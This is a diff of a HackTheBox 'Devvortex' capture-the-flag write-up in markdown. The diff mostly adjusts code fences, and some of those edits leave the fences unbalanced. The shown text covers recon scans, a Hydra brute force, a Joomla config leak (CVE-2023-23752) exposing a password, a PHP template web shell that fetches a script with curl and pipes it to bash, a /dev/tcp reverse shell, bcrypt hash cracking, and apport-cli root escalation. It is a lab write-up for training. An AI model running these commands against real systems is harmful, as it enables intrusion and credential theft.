@@ -5,7 +5,7 @@ categories: [HackTheBox Writeups]
 tags: [hackthebox, linux]
 ---
 
-```
+```bash
 ares@legion:~$ sudo nmap -sV -A -T4 $target
 [sudo] password for ares: 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 21:59 EET
@@ -36,8 +36,7 @@ HOP RTT      ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 10.29 seconds
 
-```
-
+```bash
 Fuzz for Subdomains:
 ```
 ffuf -u 'http://devvortex.htb/' -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 100 -H 
@@ -46,17 +45,15 @@ ffuf -u 'http://devvortex.htb/' -c -w /usr/share/seclists/Discovery/DNS/subdomai
 dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 8261ms]
 :: Progress: [19966/19966] :: Job [1/1] :: 708 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
 
-```
-
+```bash
 Subdomain directory:
-```
+```bash
 ares@legion:~/HackTheBox/Devvortex$ feroxbuster -u http://dev.devvortex.htb  -e -q -n --no-state -w /usr/share/seclists/Discovery/Web-Content/common.txt -o ferox_light.txt 
 
 301      GET        7l       12w      178c http://dev.devvortex.htb/administrator => http://dev.devvortex.htb/administrator/
 301      GET        7l       12w      178c http://dev.devvortex.htb/api => http://dev.devvortex.htb/api/
 
-```
-
+```bash
 Hydra Brute-Force Admin login page:
 ```
 ares@legion:~/HackTheBox/Devvortex$ hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt dev.devvortex.htb http-get /administrator -V -e nsr -f -t 50 -K
@@ -66,7 +63,7 @@ ares@legion:~/HackTheBox/Devvortex$ hydra -L /usr/share/wordlists/seclists/Usern
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-06 22:37:00
 
-```
+```bash
 Creds do not work.
 
 Default path for joomla instances > Check version
@@ -82,7 +79,7 @@ https://github.com/Acceis/exploit-CVE-2023-23752
 curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true -vv
 
 user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}
-```
+```bash
 ![20251106233255.png](/assets/img/htb-writeups/Pasted image 20251106233255.png)
 
 Burp:
@@ -95,13 +92,11 @@ System > Site Template > Cassiopea Files
 One-Liner Script to fetch via curl request:
 ```
 <?php system("curl 10.10.14.30:8000/rev.sh|bash"); ?> // in error.php
-```
-```
+```bash
 echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.30/4444 0>&1' > rev.sh
-```
-```
+```bash
 curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
-```
+```bash
 Start 8000 and 443 listeners. 
 Tried other php rev shells but didn't work.
 
@@ -114,7 +109,7 @@ show databases;
 use joomla;
 show tables
 select * from sd4fg_users;
-```
+```bash
 ![20251107001915.png](/assets/img/htb-writeups/Pasted image 20251107001915.png)
 
 Logan
@@ -125,9 +120,8 @@ Analyzing '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
 [+] Blowfish(OpenBSD) 
 [+] Woltlab Burning Board 4.x 
 [+] bcrypt
-```
-
-```
+```bash
+```bash
 echo '$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u' > hash
 hashcat --example-hashes | grep -B5 -A5 bcrypt
 hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt 
@@ -155,8 +149,7 @@ Hardware.Mon.#01.: Temp: 48c Util: 93%
 Started: Fri Nov  7 00:24:35 2025
 Stopped: Fri Nov  7 00:25:26 2025
 
-```
-
+```bash
 Privesc:
 ```
 logan@devvortex:~$ sudo -l
@@ -172,19 +165,17 @@ logan@devvortex:~$ /usr/bin/apport-cli --version
 /usr/bin/apport-cli --version
 2.20.11
 logan@devvortex:~$ 
-```
-
+```bash
 Vulnerable to:
 https://nvd.nist.gov/vuln/detail/CVE-2023-1326
 
 guide:
 https://0xd1eg0.medium.com/cve-2023-1326-poc-c8f2a59d0e00
 
-```
+```bash
 sudo /usr/bin/apport-cli --file-bug
 
 Select 8 > View Report > !/bin/bash
-```
-
+```bash
 
 
